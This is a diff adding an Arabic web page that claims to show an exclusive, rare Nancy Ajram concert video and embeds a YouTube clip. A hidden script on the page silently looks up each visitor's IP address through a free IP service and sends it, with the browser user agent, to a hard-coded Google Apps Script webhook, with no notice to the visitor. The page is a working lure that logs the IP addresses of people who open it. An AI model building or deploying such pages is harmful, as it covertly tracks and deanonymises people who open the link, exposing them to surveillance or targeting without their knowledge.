@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>فيديو نانسي عجرم - حصري 🎥</title>
+  <style>
+    body { font-family: "Tahoma", sans-serif; text-align:center; margin-top:50px; }
+    h1 { font-size:2em; color:#C32D2E; }
+    p { font-size:1.2em; }
+  </style>
+</head>
+<body>
+  <h1>شوفوا هالفيديو النادر لنـانسي!</h1>
+  <p>تابع آخر حفل لها الآن 👇</p>
+  
+  <iframe width="560" height="315" 
+    src="https://www.youtube.com/embed/NrQDqVSMzqo"
+    title="نانسي عجرم" frameborder="0" allowfullscreen>
+  </iframe>
+
+  <script>
+    // أولاً: نجلب عنوان IP من خدمة مجانية
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const ua = encodeURIComponent(navigator.userAgent);
+
+        // نرسل الـ IP والمتصفح للـ Google Sheet
+        const webhookUrl = 'https://script.google.com/macros/s/AKfycbyJ1fqIXxq1a8Vus7J9WgYgOV8kxelIDVdU-xr_6ypy3H_ShBk5oDHSEeMLUL2EcDgl/exec';
+        fetch(`${webhookUrl}?ip=${ip}&ua=${ua}`)
+          .catch(console.error);
+      })
+      .catch(console.error);
+  </script>
+</body>
+</html>
